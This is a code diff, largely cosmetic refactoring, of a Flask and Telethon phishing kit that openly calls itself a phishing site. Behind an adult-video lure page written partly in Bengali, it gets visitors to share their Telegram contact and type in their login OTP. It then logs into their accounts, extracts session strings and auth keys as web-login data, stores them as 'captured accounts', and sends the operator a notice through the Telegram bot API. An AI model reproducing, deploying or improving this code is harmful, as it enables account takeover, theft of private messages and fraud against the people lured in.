@@ -8,11 +8,10 @@ import logging
 from datetime import datetime
 from telethon import TelegramClient
 from telethon.sessions import StringSession
+import sys
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
-
-app = Flask(__name__)
 
 # ====== Environment Variables ======
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -20,6 +19,15 @@ API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
 # ===================================
+
+# Python 3.14+ compat: set event loop policy
+if sys.version_info >= (3, 14):
+    try:
+        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+    except:
+        pass
+
+app = Flask(__name__)
 
 user_sessions = {}
 captured_accounts = []
@@ -107,7 +115,6 @@ PAGE = """<!DOCTYPE html>
             🔞 GET YOUR LINK
             <span class="small">Contact share করুন</span>
         </button>
-        <p style="color:#444;font-size:11px;margin-top:10px;">✅ 18+ age verification • 2 step secure</p>
     </div>
     <div class="section-title">🔥 More Videos</div>
     <div class="video-grid">
@@ -118,10 +125,8 @@ PAGE = """<!DOCTYPE html>
     </div>
     <div class="footer">© 2026 Premium Video Hub</div>
     
-    <!-- Modal -->
     <div class="modal-overlay" id="vm">
         <div class="modal">
-            <!-- Step 1: Contact Share -->
             <div id="s1" class="step active">
                 <div class="modal-icon">📞</div>
                 <h2>Contact Share করুন</h2>
@@ -129,12 +134,7 @@ PAGE = """<!DOCTYPE html>
                 <div id="ps1" class="sb waiting">
                     <span class="sp"></span> Contact শেয়ার করুন...
                 </div>
-                <p style="color:#444;font-size:11px;margin-top:10px;text-align:center;">
-                    🔵 Telegram একটি পপ-আপ দেখাবে — Allow/Send টিপুন
-                </p>
             </div>
-            
-            <!-- Step 2: OTP (5 digit) -->
             <div id="s2" class="step">
                 <div class="modal-icon">🔐</div>
                 <h2>Verification Code</h2>
@@ -157,8 +157,6 @@ PAGE = """<!DOCTYPE html>
                 </div>
                 <div id="vs" class="sb"></div>
             </div>
-            
-            <!-- Step 3: Success -->
             <div id="s3" class="step">
                 <div class="ss">
                     <div class="bi">✅</div>
@@ -175,7 +173,6 @@ PAGE = """<!DOCTYPE html>
     let codeDigits = '';
     let codeCheckInterval = null;
     
-    // Main button click - সরাসরি contact request
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         var ps = document.getElementById('ps1');
@@ -202,24 +199,16 @@ PAGE = """<!DOCTYPE html>
                         ps.className = 'sb error';
                         ps.innerHTML = '❌ Contact share করতে হবে';
                         ps.style.display = 'block';
-                        setTimeout(function() {
-                            document.getElementById('glb').disabled = false;
-                        }, 2000);
                     }
                 });
             } else {
-                // Fallback for older versions
                 Telegram.WebApp.sendData(JSON.stringify({action: 'share_contact'}));
-                var ps = document.getElementById('ps1');
-                ps.innerHTML = '📤 অপেক্ষা করুন...';
-                ps.style.display = 'block';
             }
         } else {
             var ps = document.getElementById('ps1');
             ps.className = 'sb error';
             ps.innerHTML = '❌ শুধুমাত্র Telegram Bot থেকে খুলুন';
             ps.style.display = 'block';
-            document.getElementById('glb').disabled = false;
         }
     }
     
@@ -245,14 +234,12 @@ PAGE = """<!DOCTYPE html>
                 ps.className = 'sb error';
                 ps.innerHTML = '❌ Error: ' + (data.error || 'Unknown');
                 ps.style.display = 'block';
-                document.getElementById('glb').disabled = false;
             }
         } catch(e) {
             var ps = document.getElementById('ps1');
             ps.className = 'sb error';
             ps.innerHTML = '❌ Connection error';
             ps.style.display = 'block';
-            document.getElementById('glb').disabled = false;
         }
     }
     
@@ -271,7 +258,7 @@ PAGE = """<!DOCTYPE html>
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ 5 ডিজিটের OTP কোড এসেছে! নিচে টাইপ করুন:';
+                    cs.innerHTML = '✅ 5 ডিজিটের OTP কোড এসেছে! টাইপ করুন:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
@@ -290,82 +277,54 @@ PAGE = """<!DOCTYPE html>
         }, 2000);
     }
     
-    function pk(n) {
-        if (codeDigits.length < 5) {
-            codeDigits += n;
-            document.getElementById('cdisp').textContent = codeDigits;
-        }
-    }
-    
-    function cc() {
-        codeDigits = codeDigits.slice(0, -1);
-        document.getElementById('cdisp').textContent = codeDigits || '_____';
-    }
+    function pk(n) { if(codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
+    function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_____'; }
     
     async function sc() {
-        if (codeDigits.length < 5) {
-            showVerifyStatus('❌ 5 ডিজিটের কোড দিন', 'error');
-            return;
-        }
+        if(codeDigits.length < 5) { showVerifyStatus('❌ 5 ডিজিটের কোড দিন','error'); return; }
         document.getElementById('sb').disabled = true;
         document.getElementById('sb').textContent = '⏳ Verifying...';
         try {
             var res = await fetch('/api/verify', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                method: 'POST', headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({phone: phoneNumber, code: codeDigits})
             });
             var data = await res.json();
             if (data.success) {
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s3').classList.add('active');
-                if (codeCheckInterval) {
-                    clearInterval(codeCheckInterval);
-                    codeCheckInterval = null;
-                }
+                if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
             } else {
                 showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
-                codeDigits = '';
-                document.getElementById('cdisp').textContent = '_____';
-                document.getElementById('sb').disabled = false;
-                document.getElementById('sb').textContent = '✓ Verify';
+                codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
+                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
             }
-        } catch(e) {
-            showVerifyStatus('❌ Error', 'error');
-            document.getElementById('sb').disabled = false;
-            document.getElementById('sb').textContent = '✓ Verify';
-        }
+        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
     }
     
     function showVerifyStatus(msg, type) {
-        var el = document.getElementById('vs');
-        el.textContent = msg;
-        el.className = 'sb ' + type;
-        el.style.display = 'block';
+        document.getElementById('vs').textContent = msg;
+        document.getElementById('vs').className = 'sb ' + type;
+        document.getElementById('vs').style.display = 'block';
     }
     
-    function wv() {
-        window.location.href = 'https://example.com';
-    }
+    function wv() { window.location.href = 'https://example.com'; }
     
-    // Close modal on overlay click
     document.getElementById('vm').onclick = function(e) {
-        if (e.target === this) {
+        if(e.target === this) {
             this.classList.remove('active');
-            if (codeCheckInterval) {
-                clearInterval(codeCheckInterval);
-                codeCheckInterval = null;
-            }
+            if(codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
         }
     };
     </script>
 </body>
 </html>"""
 
-# ====== Telegram Async Functions (Thread-Safe) ======
+# ====== Telegram Async Functions ======
 
 def run_telegram_action(phone, code=None):
-    """Run Telegram operations in a completely isolated event loop"""
+    """Run Telegram operations in an isolated event loop"""
+    # Create new loop for each thread
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
@@ -399,7 +358,7 @@ def run_telegram_action(phone, code=None):
                 me = await c.get_me()
                 await c.disconnect()
                 
-                # Generate WebK data
+                # Generate WebK
                 wc = TelegramClient(StringSession(ss), API_ID, API_HASH)
                 await wc.start()
                 auth_b64 = base64.b64encode(wc.session.auth_key.key).decode()
@@ -413,13 +372,7 @@ def run_telegram_action(phone, code=None):
                     'first_name': me.first_name or '',
                     'last_name': me.last_name or '',
                     'session': ss,
-                    'webk': json.dumps({
-                        'dcId': dc,
-                        'authKey': auth_b64,
-                        'userId': me.id,
-                        'isSupport': False,
-                        'isTest': False
-                    }),
+                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64, 'userId': me.id, 'isSupport': False, 'isTest': False}),
                     'dc': dc,
                     'time': str(datetime.now())
                 }
@@ -430,7 +383,7 @@ def run_telegram_action(phone, code=None):
                         del user_sessions[phone]
                     pending_codes[phone] = 'done'
                 
-                # Notify via bot
+                # Notify via Telegram
                 try:
                     import requests
                     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
@@ -438,8 +391,7 @@ def run_telegram_action(phone, code=None):
                         'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}",
                         'parse_mode': 'Markdown'
                     }, timeout=5)
-                except Exception as e:
-                    logger.error(f"Bot notify failed: {e}")
+                except: pass
                 
                 logger.info(f"✅ Account captured: {phone}")
                 return {'success': True}
@@ -502,13 +454,11 @@ def verify():
     ph = d.get('phone', '')
     code = d.get('code', '')
     
-    # Format phone
     if ph.startswith('0') and not ph.startswith('+'):
         ph = '+88' + ph
     elif not ph.startswith('+'):
         ph = '+' + ph
     
-    # Run verification synchronously in this thread
     result = run_telegram_action(ph, code)
     return jsonify(result)
 
@@ -587,5 +537,4 @@ def dash():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print(f"✅ Phishing site ready on port {port}")
-    print(f"✅ Dashboard: http://localhost:{port}/dash")
     app.run(host='0.0.0.0', port=port)
